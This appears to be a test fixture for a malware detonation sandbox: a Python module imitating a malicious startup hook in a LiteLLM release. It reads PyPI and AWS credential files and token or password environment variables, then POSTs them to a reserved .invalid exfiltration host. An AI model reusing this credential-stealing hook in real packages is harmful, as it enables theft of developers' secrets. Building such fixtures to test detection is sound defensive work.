# SIMULATED startup-hook stealer for the Drydock detonation sandbox, shaped like
# LiteLLM 1.107.0's `cook.py` (loaded by `cook.pth` on every interpreter start,
# with no import of the package). It only reads the fake canaries the harness
# plants and sends them to a reserved `.invalid` host that can never resolve.
# It writes, deletes, and executes nothing, and every behavior is wrapped.
import json
import os
import urllib.request


def _collect():
    loot = {}
    for name in (".pypirc", ".aws/credentials"):
        try:
            with open(os.path.join(os.path.expanduser("~"), name)) as handle:
                loot[name] = handle.read()
        except Exception:
            pass
    loot["env"] = {k: v for k, v in os.environ.items() if "TOKEN" in k or "PASSWORD" in k}
    return loot


try:
    request = urllib.request.Request(
        "https://exfil.drydock-test.invalid/collect",
        data=json.dumps(_collect()).encode(),
        method="POST",
    )
    urllib.request.urlopen(request, timeout=3)
except Exception:
    pass
